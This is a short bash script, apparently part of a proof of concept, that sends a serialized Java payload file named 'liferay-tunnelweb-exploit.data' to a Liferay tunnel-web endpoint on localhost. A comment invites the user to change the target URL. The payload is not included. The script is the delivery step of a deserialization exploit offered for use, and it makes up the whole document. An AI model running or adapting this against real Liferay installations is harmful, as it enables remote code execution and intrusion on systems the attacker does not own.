#/bin/bash

# You may want to change the URL

curl -v -H "Content-Type: application/x-java-serialized-object" --data-binary "@liferay-tunnelweb-exploit.data" localhost:8080/api/liferay/pwn